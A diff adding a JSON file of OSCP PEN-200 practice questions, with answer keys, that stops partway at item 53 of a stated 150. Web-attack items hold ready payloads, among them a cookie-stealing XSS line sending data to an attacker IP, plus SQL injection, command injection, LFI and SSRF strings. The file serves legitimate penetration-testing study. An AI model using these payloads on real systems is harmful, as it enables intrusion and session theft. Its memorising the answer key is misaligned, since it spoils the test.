@@ -1,0 +1,2437 @@
+{
+  "metadata": {
+    "title": "OffSec OSCP PEN-200 Practice Questions",
+    "version": "1.0",
+    "total_questions": 150,
+    "exam": "PEN-200",
+    "domains": {
+      "1": {
+        "name": "Information Gathering and Enumeration",
+        "weight": 15,
+        "count": 23
+      },
+      "2": {
+        "name": "Web Application Attacks",
+        "weight": 20,
+        "count": 30
+      },
+      "3": {
+        "name": "System and Network Exploitation",
+        "weight": 25,
+        "count": 37
+      },
+      "4": {
+        "name": "Privilege Escalation",
+        "weight": 20,
+        "count": 30
+      },
+      "5": {
+        "name": "Post-Exploitation and Pivoting",
+        "weight": 20,
+        "count": 30
+      }
+    }
+  },
+  "questions": [
+    {
+      "id": 1,
+      "domain": 1,
+      "objective": "1.1",
+      "difficulty": "easy",
+      "question": "Which Nmap scan type performs a TCP SYN scan, also known as a 'stealth scan'?",
+      "options": [
+        "nmap -sU",
+        "nmap -sN",
+        "nmap -sT",
+        "nmap -sS"
+      ],
+      "correct": 3,
+      "explanation": "The -sS flag performs a SYN scan (half-open scan) which sends SYN packets and analyzes responses without completing the TCP handshake, making it stealthier than a full connect scan (-sT).",
+      "link": "start-here.html"
+    },
+    {
+      "id": 2,
+      "domain": 1,
+      "objective": "1.1",
+      "difficulty": "medium",
+      "question": "You need to identify all live hosts on a /24 subnet without performing a port scan. Which Nmap command achieves this?",
+      "options": [
+        "nmap -sn 10.10.10.0/24",
+        "nmap -sV 10.10.10.0/24",
+        "nmap -O 10.10.10.0/24",
+        "nmap -Pn 10.10.10.0/24"
+      ],
+      "correct": 0,
+      "explanation": "The -sn flag (ping scan) performs host discovery only without port scanning. -Pn skips host discovery entirely, -sV does version detection, and -O does OS detection, all of which involve port scanning.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 3,
+      "domain": 1,
+      "objective": "1.1",
+      "difficulty": "medium",
+      "question": "Which Nmap option enables OS detection, version detection, script scanning, and traceroute in a single flag?",
+      "options": [
+        "-p-",
+        "-sC",
+        "-T4",
+        "-A"
+      ],
+      "correct": 3,
+      "explanation": "The -A flag enables aggressive scanning which combines OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute (--traceroute) into one convenient option.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 4,
+      "domain": 1,
+      "objective": "1.2",
+      "difficulty": "hard",
+      "question": "During enumeration of a Windows domain controller, which LDAP query filter would enumerate all user accounts?",
+      "options": [
+        "(&(objectClass=organizationalUnit)(ou=*))",
+        "(&(objectClass=computer)(objectCategory=*))",
+        "(&(objectClass=user)(objectCategory=person))",
+        "(&(objectClass=group)(cn=*))"
+      ],
+      "correct": 2,
+      "explanation": "The LDAP filter (&(objectClass=user)(objectCategory=person)) specifically targets user account objects in Active Directory, filtering out computer accounts and other object types.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 5,
+      "domain": 1,
+      "objective": "1.2",
+      "difficulty": "medium",
+      "question": "Which tool is specifically designed for enumerating SMB shares, users, and groups on a target system?",
+      "options": [
+        "wpscan",
+        "dirb",
+        "enum4linux",
+        "nikto"
+      ],
+      "correct": 2,
+      "explanation": "enum4linux is a Linux tool designed for enumerating information from Windows and Samba systems via SMB, including shares, users, groups, and password policies. Nikto and dirb target web servers, and wpscan targets WordPress.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 6,
+      "domain": 1,
+      "objective": "1.2",
+      "difficulty": "hard",
+      "question": "You discover SNMP running on a target. Which community string should you try first, and which OID tree contains system information?",
+      "options": [
+        "'public' community string; OID 1.3.6.1.2.1.1 (system)",
+        "'admin' community string; OID 1.3.6.1.2.1.2 (interfaces)",
+        "'default' community string; OID 1.3.6.1.2.1.25 (host)",
+        "'private' community string; OID 1.3.6.1.4.1 (enterprises)"
+      ],
+      "correct": 0,
+      "explanation": "The default read-only community string is 'public', and the system OID tree 1.3.6.1.2.1.1 contains basic system information including hostname, description, and uptime. This is always the first enumeration target for SNMP.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 7,
+      "domain": 1,
+      "objective": "1.3",
+      "difficulty": "medium",
+      "question": "Which DNS record type is most useful for discovering mail servers during reconnaissance?",
+      "options": [
+        "TXT records",
+        "CNAME records",
+        "MX records",
+        "A records"
+      ],
+      "correct": 2,
+      "explanation": "MX (Mail Exchange) records specify the mail servers responsible for accepting email for a domain. These reveal additional infrastructure that may be in scope for testing.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 8,
+      "domain": 1,
+      "objective": "1.3",
+      "difficulty": "hard",
+      "question": "You want to perform a DNS zone transfer against a target domain. Which command correctly attempts this?",
+      "options": [
+        "nslookup -type=ALL target.com ns1.target.com",
+        "dig axfr @ns1.target.com target.com",
+        "host -a target.com ns1.target.com",
+        "dig mx @ns1.target.com target.com"
+      ],
+      "correct": 1,
+      "explanation": "The 'dig axfr' command requests a full zone transfer (AXFR) from the specified nameserver. If the server is misconfigured to allow zone transfers, it will return all DNS records for the domain.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 9,
+      "domain": 1,
+      "objective": "1.3",
+      "difficulty": "easy",
+      "question": "Which tool is commonly used for DNS subdomain brute-forcing during OSCP engagements?",
+      "options": [
+        "metasploit",
+        "gobuster dns",
+        "burpsuite",
+        "sqlmap"
+      ],
+      "correct": 1,
+      "explanation": "Gobuster's dns mode is specifically designed for subdomain enumeration through brute-forcing. It iterates through a wordlist and queries DNS to discover valid subdomains of a target domain.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 10,
+      "domain": 1,
+      "objective": "1.4",
+      "difficulty": "medium",
+      "question": "During an OSCP exam, you discover port 111 (rpcbind) open on a Linux target. What is the most appropriate next enumeration step?",
+      "options": [
+        "Run 'nikto -h target' to scan for web vulnerabilities",
+        "Run 'smbclient -L target' to list SMB shares",
+        "Run 'hydra -l root target ssh' to brute-force SSH",
+        "Run 'showmount -e target' to check for NFS exports"
+      ],
+      "correct": 3,
+      "explanation": "Port 111 (rpcbind) often indicates NFS services. Running 'showmount -e' reveals exported file systems that may contain sensitive data or allow unauthorized mounting for file access.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 11,
+      "domain": 1,
+      "objective": "1.4",
+      "difficulty": "hard",
+      "question": "Which Nmap NSE script category should you use to safely enumerate vulnerabilities without exploitation during an assessment?",
+      "options": [
+        "--script=vuln",
+        "--script=exploit",
+        "--script=dos",
+        "--script=brute"
+      ],
+      "correct": 0,
+      "explanation": "The 'vuln' script category runs vulnerability detection scripts that check for known vulnerabilities without actually exploiting them, making it safe for enumeration. The 'exploit' category would attempt actual exploitation.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 12,
+      "domain": 1,
+      "objective": "1.4",
+      "difficulty": "medium",
+      "question": "You find port 161/UDP open. Which command would you use to walk the entire SNMP MIB tree?",
+      "options": [
+        "snmpwalk -v2c -c public target",
+        "snmpget -v2c -c public target 1.3.6.1",
+        "snmptrap -v2c -c public target",
+        "snmpset -v2c -c public target 1.3.6.1"
+      ],
+      "correct": 0,
+      "explanation": "snmpwalk traverses the entire SNMP MIB tree starting from a given OID, returning all available information. snmpget retrieves a single OID value, snmpset modifies values, and snmptrap sends trap notifications.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 13,
+      "domain": 1,
+      "objective": "1.5",
+      "difficulty": "easy",
+      "question": "What is the purpose of running 'whatweb' against a target URL during reconnaissance?",
+      "options": [
+        "Brute-force web directories",
+        "Identify web technologies, frameworks, and server software",
+        "Intercept and modify HTTP requests",
+        "Perform SQL injection testing"
+      ],
+      "correct": 1,
+      "explanation": "WhatWeb identifies web technologies including CMS platforms, JavaScript libraries, web servers, and embedded devices. This technology fingerprinting helps identify potential attack vectors specific to the software in use.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 14,
+      "domain": 1,
+      "objective": "1.5",
+      "difficulty": "hard",
+      "question": "During OSINT, you discover a company's Git repository is publicly accessible. Which command clones the repo and includes all commit history for credential harvesting?",
+      "options": [
+        "git clone https://target.com/repo.git && cd repo && git log -p",
+        "wget -r https://target.com/repo.git",
+        "git clone --depth 1 https://target.com/repo.git",
+        "curl -O https://target.com/repo.git"
+      ],
+      "correct": 0,
+      "explanation": "A full git clone downloads the complete repository history. Running 'git log -p' shows all commits with diffs, which may reveal accidentally committed credentials, API keys, or configuration files in previous commits.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 15,
+      "domain": 1,
+      "objective": "1.5",
+      "difficulty": "medium",
+      "question": "Which Nmap scan technique is best for scanning through a firewall that blocks SYN packets?",
+      "options": [
+        "SYN scan (-sS)",
+        "ACK scan (-sA)",
+        "Version scan (-sV)",
+        "Connect scan (-sT)"
+      ],
+      "correct": 1,
+      "explanation": "The ACK scan (-sA) sends ACK packets which can bypass some firewalls that only filter SYN packets. It helps determine firewall ruleset and identify filtered versus unfiltered ports.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 16,
+      "domain": 1,
+      "objective": "1.1",
+      "difficulty": "hard",
+      "question": "You need to scan all 65535 TCP ports on a target as quickly as possible. Which Nmap command is most efficient?",
+      "options": [
+        "nmap -sV -sC -A target",
+        "nmap -p- --min-rate 10000 -T4 target",
+        "nmap --top-ports 1000 target",
+        "nmap -sU -p- target"
+      ],
+      "correct": 1,
+      "explanation": "The -p- flag scans all 65535 ports, --min-rate 10000 sends packets at a minimum of 10000 per second, and -T4 sets aggressive timing. This combination provides a fast full port scan while maintaining reliability.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 17,
+      "domain": 1,
+      "objective": "1.2",
+      "difficulty": "medium",
+      "question": "Which smbclient command lists available shares on a target using a null session?",
+      "options": [
+        "smbclient -L //target -N",
+        "smbclient //target/IPC$ -N",
+        "smbclient //target/C$ -U admin",
+        "smbclient -L //target -U admin%password"
+      ],
+      "correct": 0,
+      "explanation": "The -L flag lists available shares, //target specifies the server, and -N specifies no password (null session). Null sessions can reveal share names, usernames, and other information on misconfigured systems.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 18,
+      "domain": 1,
+      "objective": "1.3",
+      "difficulty": "easy",
+      "question": "What does the Nmap -sV flag do?",
+      "options": [
+        "Enable verbose output mode",
+        "Perform a SYN stealth scan",
+        "Scan for vulnerabilities using NSE scripts",
+        "Probe open ports to determine service and version information"
+      ],
+      "correct": 3,
+      "explanation": "The -sV flag enables version detection, which probes open ports with various payloads to identify the service name and version. This information is critical for finding version-specific exploits.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 19,
+      "domain": 1,
+      "objective": "1.4",
+      "difficulty": "hard",
+      "question": "You discover an MSRPC endpoint mapper on port 135. Which Impacket tool would you use to enumerate RPC endpoints?",
+      "options": [
+        "secretsdump.py",
+        "smbexec.py",
+        "rpcdump.py",
+        "psexec.py"
+      ],
+      "correct": 2,
+      "explanation": "Impacket's rpcdump.py queries the RPC endpoint mapper on port 135 to enumerate all registered RPC services and their associated named pipes and TCP ports, revealing additional attack surface.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 20,
+      "domain": 1,
+      "objective": "1.5",
+      "difficulty": "medium",
+      "question": "Which tool would you use to enumerate valid usernames against an SMTP service?",
+      "options": [
+        "nikto with SMTP plugin",
+        "smtp-user-enum with VRFY or EXPN commands",
+        "hydra with SMTP module",
+        "dirb with SMTP wordlist"
+      ],
+      "correct": 1,
+      "explanation": "smtp-user-enum uses SMTP commands like VRFY (verify user) and EXPN (expand mailing list) to enumerate valid usernames on the mail server, which can then be used for password attacks.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 21,
+      "domain": 1,
+      "objective": "1.2",
+      "difficulty": "hard",
+      "question": "You need to enumerate Active Directory users through an LDAP anonymous bind. Which ldapsearch command is correct?",
+      "options": [
+        "ldapsearch -H ldap://target -W -b 'DC=corp,DC=local'",
+        "ldapsearch -x -H ldap://target -b 'DC=corp,DC=local' '(objectClass=user)'",
+        "ldapsearch -x -H ldap://target -s base namingcontexts",
+        "ldapsearch -x -H ldap://target -b 'CN=Users' '(objectClass=*)'"
+      ],
+      "correct": 1,
+      "explanation": "This command uses simple authentication (-x) without credentials (anonymous bind), connects to the target's LDAP service, specifies the base DN, and filters for user objects. Anonymous binds on misconfigured DCs can reveal the entire user list.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 22,
+      "domain": 1,
+      "objective": "1.3",
+      "difficulty": "easy",
+      "question": "Which command performs a reverse DNS lookup for an IP address?",
+      "options": [
+        "nslookup 10.10.10.5",
+        "nslookup -type=MX 10.10.10.5",
+        "host -t AAAA 10.10.10.5",
+        "dig +short 10.10.10.5 MX"
+      ],
+      "correct": 0,
+      "explanation": "Running nslookup with an IP address performs a reverse DNS lookup (PTR query), which resolves an IP address back to its hostname. This can reveal internal naming conventions and additional targets.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 23,
+      "domain": 1,
+      "objective": "1.4",
+      "difficulty": "medium",
+      "question": "During enumeration, you find FTP on port 21 allows anonymous login. What credentials should you use?",
+      "options": [
+        "Username: ftp, Password: ftp",
+        "Username: root, Password: (blank)",
+        "Username: anonymous, Password: (any email or blank)",
+        "Username: admin, Password: admin"
+      ],
+      "correct": 2,
+      "explanation": "Anonymous FTP login uses the username 'anonymous' with any email address or blank password. This is a standard convention that allows unauthenticated access to files the administrator has made publicly available.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 24,
+      "domain": 2,
+      "objective": "2.1",
+      "difficulty": "easy",
+      "question": "Which tool is the most common web directory brute-forcer used in OSCP engagements?",
+      "options": [
+        "netcat",
+        "john",
+        "nmap",
+        "gobuster dir"
+      ],
+      "correct": 3,
+      "explanation": "Gobuster's dir mode is a fast, multi-threaded directory and file brute-forcing tool that uses wordlists to discover hidden paths and files on web servers. It is one of the most commonly used tools in OSCP for web enumeration.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 25,
+      "domain": 2,
+      "objective": "2.1",
+      "difficulty": "medium",
+      "question": "You discover a login page vulnerable to SQL injection. Which payload would you use to bypass authentication?",
+      "options": [
+        "; cat /etc/passwd",
+        "../../etc/passwd",
+        "' OR 1=1 --",
+        "<script>alert(1)</script>"
+      ],
+      "correct": 2,
+      "explanation": "The payload ' OR 1=1 -- closes the original query string, adds a condition that is always true (1=1), and comments out the rest of the query with --, effectively bypassing authentication logic.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 26,
+      "domain": 2,
+      "objective": "2.1",
+      "difficulty": "hard",
+      "question": "When performing a UNION-based SQL injection, what must be true about the UNION SELECT statement?",
+      "options": [
+        "The application must use GET parameters",
+        "The number of columns must match the original query",
+        "The database must be MySQL",
+        "The web server must run Apache"
+      ],
+      "correct": 1,
+      "explanation": "A UNION SELECT statement requires the same number of columns as the original query, and the data types must be compatible. Attackers typically use ORDER BY or UNION SELECT NULL to determine the correct column count.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 27,
+      "domain": 2,
+      "objective": "2.2",
+      "difficulty": "medium",
+      "question": "Which sqlmap option specifies the vulnerable parameter in a URL?",
+      "options": [
+        "-p parameter_name",
+        "--dump",
+        "--dbs",
+        "--tables"
+      ],
+      "correct": 0,
+      "explanation": "The -p flag tells sqlmap which specific parameter to test for SQL injection. While sqlmap can auto-detect injectable parameters, specifying -p focuses the attack and reduces noise.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 28,
+      "domain": 2,
+      "objective": "2.2",
+      "difficulty": "hard",
+      "question": "You have confirmed SQL injection and want to read /etc/passwd through MySQL. Which sqlmap command achieves this?",
+      "options": [
+        "sqlmap -u 'http://target/page?id=1' --file-read=/etc/passwd",
+        "sqlmap -u 'http://target/page?id=1' --dump-all",
+        "sqlmap -u 'http://target/page?id=1' --os-shell",
+        "sqlmap -u 'http://target/page?id=1' --passwords"
+      ],
+      "correct": 0,
+      "explanation": "The --file-read flag uses SQL injection to read files from the server's filesystem through the database's file reading functions (like MySQL's LOAD_FILE()). This requires FILE privilege on the database user.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 29,
+      "domain": 2,
+      "objective": "2.3",
+      "difficulty": "medium",
+      "question": "What is the primary difference between stored XSS and reflected XSS?",
+      "options": [
+        "Reflected XSS can steal cookies while stored XSS cannot",
+        "Reflected XSS persists on the server while stored XSS is temporary",
+        "Stored XSS only works in POST requests while reflected works in GET",
+        "Stored XSS persists on the server while reflected XSS requires the victim to click a crafted link"
+      ],
+      "correct": 3,
+      "explanation": "Stored (persistent) XSS saves the malicious script in the application's database and executes for every user who views the affected page. Reflected XSS requires social engineering to get victims to click a crafted URL containing the payload.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 30,
+      "domain": 2,
+      "objective": "2.3",
+      "difficulty": "hard",
+      "question": "Which XSS payload would steal a user's session cookie and send it to your attacker machine at 10.10.14.5?",
+      "options": [
+        "<img src=x onerror=alert(1)>",
+        "<script>window.location='http://10.10.14.5'</script>",
+        "<script>alert(document.cookie)</script>",
+        "<script>new Image().src='http://10.10.14.5/steal?c='+document.cookie</script>"
+      ],
+      "correct": 3,
+      "explanation": "This payload creates an Image object with the src pointing to the attacker's server, appending the victim's cookie as a URL parameter. The browser sends the GET request with the cookie data to the attacker's listener.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 31,
+      "domain": 2,
+      "objective": "2.4",
+      "difficulty": "medium",
+      "question": "Which payload tests for Local File Inclusion (LFI) on a Linux web server?",
+      "options": [
+        "../../../../etc/passwd",
+        "<script>alert(1)</script>",
+        "'; DROP TABLE users; --",
+        "; ls -la"
+      ],
+      "correct": 0,
+      "explanation": "Directory traversal using ../ sequences escapes the web root and accesses system files. /etc/passwd is the standard test file for LFI on Linux as it is world-readable and confirms the vulnerability exists.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 32,
+      "domain": 2,
+      "objective": "2.4",
+      "difficulty": "hard",
+      "question": "You found LFI on a PHP application. Which wrapper allows you to read PHP source code that would otherwise be executed?",
+      "options": [
+        "data://text/plain,<?php system('id'); ?>",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "expect://id",
+        "php://input"
+      ],
+      "correct": 1,
+      "explanation": "The php://filter wrapper with base64-encode reads the raw PHP source code and encodes it in base64, preventing the server from executing it. This reveals application logic, database credentials, and other sensitive information.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 33,
+      "domain": 2,
+      "objective": "2.4",
+      "difficulty": "hard",
+      "question": "How can you escalate a Local File Inclusion to Remote Code Execution via log poisoning?",
+      "options": [
+        "Inject PHP code into a log file (e.g., via User-Agent), then include the log file through the LFI",
+        "Use the LFI to modify the web server configuration",
+        "Chain the LFI with a SQL injection to write files",
+        "Upload a PHP webshell directly through the LFI parameter"
+      ],
+      "correct": 0,
+      "explanation": "Log poisoning injects PHP code into server logs (Apache access/error logs) by placing code in HTTP headers like User-Agent. When the log file is included through the LFI, the PHP code executes on the server.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 34,
+      "domain": 2,
+      "objective": "2.5",
+      "difficulty": "medium",
+      "question": "A web application allows file uploads but blocks .php extensions. Which technique might bypass this restriction?",
+      "options": [
+        "Rename the file to .txt and hope the server executes it",
+        "Upload the file via FTP instead of HTTP",
+        "Upload with alternate extensions like .php5, .phtml, or .phar",
+        "Change the file permissions to 777 before uploading"
+      ],
+      "correct": 2,
+      "explanation": "Many web servers are configured to execute alternate PHP extensions like .php5, .phtml, .phar, and .php7. If the blacklist only blocks .php, these alternatives may bypass the filter while still being executed by the PHP interpreter.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 35,
+      "domain": 2,
+      "objective": "2.5",
+      "difficulty": "hard",
+      "question": "You can upload files but the server validates the Content-Type header. How do you upload a PHP shell disguised as an image?",
+      "options": [
+        "Intercept the request with Burp Suite and change Content-Type to image/jpeg while keeping the .php extension",
+        "Convert the PHP shell to a JPEG file format",
+        "Rename the shell to .jpg and the server will execute it as PHP",
+        "Embed the PHP shell in EXIF metadata only"
+      ],
+      "correct": 0,
+      "explanation": "If the server only validates the Content-Type header but not the file extension or magic bytes, you can intercept the upload request with Burp Suite and modify the Content-Type to image/jpeg while keeping the .php extension for execution.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 36,
+      "domain": 2,
+      "objective": "2.6",
+      "difficulty": "easy",
+      "question": "Which command injection payload would you use to execute 'id' alongside a legitimate ping command?",
+      "options": [
+        "127.0.0.1 > id",
+        "127.0.0.1 = id",
+        "127.0.0.1; id",
+        "127.0.0.1 < id"
+      ],
+      "correct": 2,
+      "explanation": "The semicolon (;) separates commands in Linux, allowing 'id' to execute after the ping command completes. Other command injection operators include &&, ||, |, and backticks.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 37,
+      "domain": 2,
+      "objective": "2.6",
+      "difficulty": "medium",
+      "question": "A web application filters semicolons and pipes in user input. Which alternative command injection technique could bypass this?",
+      "options": [
+        "Use newline characters (%0a) or command substitution $(command)",
+        "Use HTML encoding for the semicolon",
+        "Use a longer command chain",
+        "Switch to a POST request"
+      ],
+      "correct": 0,
+      "explanation": "URL-encoded newline characters (%0a) and bash command substitution $(command) are often overlooked by basic input filters. The newline acts as a command separator, and $() executes the enclosed command inline.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 38,
+      "domain": 2,
+      "objective": "2.7",
+      "difficulty": "medium",
+      "question": "What is the purpose of using Burp Suite's Repeater tool during web application testing?",
+      "options": [
+        "Brute-force login pages with wordlists",
+        "Intercept and drop malicious responses",
+        "Automatically scan for all web vulnerabilities",
+        "Manually modify and resend individual HTTP requests to test different payloads"
+      ],
+      "correct": 3,
+      "explanation": "Burp Repeater allows you to manually modify HTTP requests and resend them individually, making it ideal for fine-tuning injection payloads, testing bypass techniques, and analyzing server responses to specific inputs.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 39,
+      "domain": 2,
+      "objective": "2.7",
+      "difficulty": "easy",
+      "question": "Which HTTP response code typically indicates that a directory or file exists but access is forbidden?",
+      "options": [
+        "200",
+        "500",
+        "403",
+        "404"
+      ],
+      "correct": 2,
+      "explanation": "HTTP 403 Forbidden indicates the server understood the request but refuses to authorize it. This confirms the resource exists but requires different permissions or authentication to access, unlike 404 which means the resource was not found.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 40,
+      "domain": 2,
+      "objective": "2.1",
+      "difficulty": "medium",
+      "question": "Which gobuster command brute-forces directories while looking for PHP and HTML files?",
+      "options": [
+        "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -t 100",
+        "gobuster dns -d target -w /usr/share/wordlists/dirb/common.txt",
+        "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html",
+        "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -s 200"
+      ],
+      "correct": 2,
+      "explanation": "The -x flag in gobuster specifies file extensions to append to each word in the wordlist. Using -x php,html will check for both directory names and files with those extensions, revealing hidden scripts and pages.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 41,
+      "domain": 2,
+      "objective": "2.2",
+      "difficulty": "hard",
+      "question": "You need to extract all database names from a MySQL injection point using UNION SELECT. Which payload is correct?",
+      "options": [
+        "' UNION SELECT @@version,NULL --",
+        "' UNION SELECT table_name,NULL FROM information_schema.tables --",
+        "' UNION SELECT schema_name,NULL FROM information_schema.schemata --",
+        "' UNION SELECT database(),NULL --"
+      ],
+      "correct": 2,
+      "explanation": "The information_schema.schemata table contains all database names in the schema_name column. This query returns every database on the MySQL server, enabling targeted enumeration of each database's tables and columns.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 42,
+      "domain": 2,
+      "objective": "2.3",
+      "difficulty": "easy",
+      "question": "Which type of XSS vulnerability executes entirely in the client's browser without the payload being sent to the server?",
+      "options": [
+        "Stored XSS",
+        "Blind XSS",
+        "DOM-based XSS",
+        "Reflected XSS"
+      ],
+      "correct": 2,
+      "explanation": "DOM-based XSS occurs when JavaScript modifies the DOM using unsanitized user input from sources like location.hash or document.URL. The payload never reaches the server, making it invisible to server-side security controls.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 43,
+      "domain": 2,
+      "objective": "2.5",
+      "difficulty": "medium",
+      "question": "You found a file upload that checks magic bytes. How do you create a valid image that also contains PHP code?",
+      "options": [
+        "Change the file extension from .php to .gif",
+        "Add GIF89a header to the beginning of your PHP shell file",
+        "Base64 encode the entire PHP shell",
+        "Compress the PHP shell as a ZIP file"
+      ],
+      "correct": 1,
+      "explanation": "Adding the GIF89a magic bytes to the start of a PHP file makes it pass magic byte validation as a GIF image. If the server executes files based on extension rather than content, the PHP code after the magic bytes will be executed.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 44,
+      "domain": 2,
+      "objective": "2.6",
+      "difficulty": "hard",
+      "question": "A web application passes user input to an eval() function in PHP. Which payload would achieve remote code execution?",
+      "options": [
+        "'; DROP TABLE users --",
+        "<script>alert(1)</script>",
+        "system('id')",
+        "../../../../etc/passwd"
+      ],
+      "correct": 2,
+      "explanation": "Since eval() executes the string as PHP code, passing system('id') directly executes the OS command 'id' through PHP's system() function. eval() vulnerabilities are critically dangerous as they allow arbitrary code execution.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 45,
+      "domain": 2,
+      "objective": "2.7",
+      "difficulty": "hard",
+      "question": "During a web app test, you find an SSRF vulnerability. Which payload would you use to access the server's internal metadata service on AWS?",
+      "options": [
+        "file:///etc/passwd",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost:8080/manager",
+        "http://127.0.0.1/admin"
+      ],
+      "correct": 1,
+      "explanation": "The AWS metadata service at 169.254.169.254 is accessible only from within the instance. An SSRF vulnerability allows you to make requests from the server, potentially retrieving IAM credentials, instance metadata, and other sensitive cloud configuration.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 46,
+      "domain": 2,
+      "objective": "2.4",
+      "difficulty": "medium",
+      "question": "What is the difference between Local File Inclusion (LFI) and Remote File Inclusion (RFI)?",
+      "options": [
+        "LFI requires authentication while RFI does not",
+        "LFI only works on Linux while RFI only works on Windows",
+        "LFI includes files from the local server while RFI includes files from an external URL",
+        "LFI is more dangerous than RFI in all cases"
+      ],
+      "correct": 2,
+      "explanation": "LFI loads files already present on the server (like /etc/passwd or log files), while RFI loads files from an external URL controlled by the attacker. RFI requires allow_url_include to be enabled in PHP, making it less common but more directly exploitable.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 47,
+      "domain": 2,
+      "objective": "2.5",
+      "difficulty": "easy",
+      "question": "After uploading a PHP webshell to a web server, how do you typically execute commands through it?",
+      "options": [
+        "SSH into the server using the webshell credentials",
+        "Browse to the uploaded file's URL and pass commands as a GET/POST parameter",
+        "The webshell automatically executes and sends a reverse shell",
+        "Run the webshell from the command line on your attacker machine"
+      ],
+      "correct": 1,
+      "explanation": "A PHP webshell is accessed through the web browser by navigating to its URL. Commands are passed via GET or POST parameters (e.g., ?cmd=id), and the server executes them and returns the output in the HTTP response.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 48,
+      "domain": 2,
+      "objective": "2.1",
+      "difficulty": "hard",
+      "question": "You discover a web application using JWT tokens for authentication. Which attack tests for the 'none' algorithm vulnerability?",
+      "options": [
+        "Decode the JWT, change the algorithm to 'none', remove the signature, and resend",
+        "Brute-force the JWT secret key with john",
+        "Replay an expired JWT token",
+        "Modify the payload without changing the signature"
+      ],
+      "correct": 0,
+      "explanation": "The JWT 'none' algorithm attack changes the header's 'alg' field to 'none' and removes the signature. If the server doesn't properly validate the algorithm, it accepts the unsigned token, allowing arbitrary claim modification.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 49,
+      "domain": 2,
+      "objective": "2.6",
+      "difficulty": "medium",
+      "question": "Which tool is used to intercept, modify, and forward HTTP/HTTPS traffic between browser and server during web testing?",
+      "options": [
+        "Wireshark",
+        "tcpdump",
+        "Burp Suite Proxy",
+        "Nmap"
+      ],
+      "correct": 2,
+      "explanation": "Burp Suite Proxy acts as a man-in-the-middle between the browser and web server, allowing real-time interception and modification of HTTP/HTTPS requests and responses. Wireshark and tcpdump capture traffic but cannot modify it in transit.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 50,
+      "domain": 2,
+      "objective": "2.7",
+      "difficulty": "medium",
+      "question": "Which HTTP method can be exploited to upload files to a misconfigured web server?",
+      "options": [
+        "OPTIONS",
+        "PUT",
+        "GET",
+        "HEAD"
+      ],
+      "correct": 1,
+      "explanation": "The HTTP PUT method allows uploading files directly to the server. If WebDAV or PUT is enabled without proper authentication, an attacker can upload a webshell or malicious file directly to the web root.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 51,
+      "domain": 2,
+      "objective": "2.3",
+      "difficulty": "hard",
+      "question": "Which technique allows you to bypass a Web Application Firewall (WAF) that blocks common XSS payloads like <script>?",
+      "options": [
+        "Use event handlers on HTML tags like <img src=x onerror=alert(1)> or <svg/onload=alert(1)>",
+        "Send the XSS payload in a POST request instead of GET",
+        "Use a longer script tag to exceed the WAF's inspection buffer",
+        "Encode the entire payload in base64"
+      ],
+      "correct": 0,
+      "explanation": "Event handlers on HTML elements like onerror, onload, onfocus, and onmouseover execute JavaScript without using <script> tags. WAFs that only block <script> patterns often miss these alternative execution contexts.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 52,
+      "domain": 2,
+      "objective": "2.2",
+      "difficulty": "medium",
+      "question": "What is a blind SQL injection, and how does it differ from a regular SQL injection?",
+      "options": [
+        "The application does not display query results or errors, so the attacker must infer data through true/false responses or time delays",
+        "The injection only works with INSERT statements",
+        "The attacker cannot see the login page and must guess the SQL syntax",
+        "The database is configured to hide all tables from the attacker"
+      ],
+      "correct": 0,
+      "explanation": "Blind SQL injection occurs when the application does not display database output or error messages. Attackers extract data by asking true/false questions (boolean-based) or measuring response time delays (time-based) to infer information character by character.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 53,
+      "domain": 2,
+      "objective": "2.7",
+      "difficulty": "hard",
